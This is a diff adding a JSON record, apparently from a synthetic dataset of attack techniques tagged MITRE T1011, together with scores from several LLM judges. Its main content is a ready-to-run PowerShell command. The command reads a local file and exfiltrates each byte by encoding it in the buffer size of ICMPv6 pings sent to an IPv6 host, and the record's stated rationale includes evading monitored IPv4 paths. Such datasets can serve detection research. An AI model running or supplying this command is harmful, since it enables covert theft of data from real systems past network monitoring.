@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$sync='fe80::1%13'; $d='fd00:c001::7'; Test-Connection -ComputerName $sync -Count 1 -BufferSize 333 -IPv6 -Quiet | Out-Null; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (333 + $_) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Sends a sync marker ICMPv6 echo, then exfiltrates bytes via payload size to a ULA, making use of an alternate network medium per T1011.",
+  "rationale_steps": [
+    "Emit a distinct-size ICMPv6 echo as a synchronization preamble.",
+    "Stream file bytes by encoding them in -BufferSize with a known base.",
+    "Use IPv6 destinations to avoid common monitored IPv4 paths."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-bcd0af6a",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes and braces, valid parameters, and correct separators and pipelines.",
+        "semantic_score": 4,
+        "semantic_justification": "Automates exfiltration by encoding file bytes into ICMPv6 echo payload sizes via Test-Connection, though the separate sync to a different address and lack of reliability/error-handling reduce realism.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:07:35.107809Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable assignments, balanced parentheses, correct method calls, and appropriate piping between commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements automated exfiltration by reading a file and transmitting its contents byte-by-byte through ICMP packet size manipulation over IPv6, which aligns perfectly with the T1011 technique of using automated processes to transfer collected data over alternative protocols.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:07:38.265181Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct variable assignments, cmdlet usage, parameter flags, static method calls, and command separators, typical of standard PowerShell syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements a covert channel to exfiltrate data by encoding file bytes into ICMPv6 echo request buffer sizes, fitting the T1011 description of automated exfiltration via an alternative protocol to an internal or peered network destination.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:07:53.226977Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
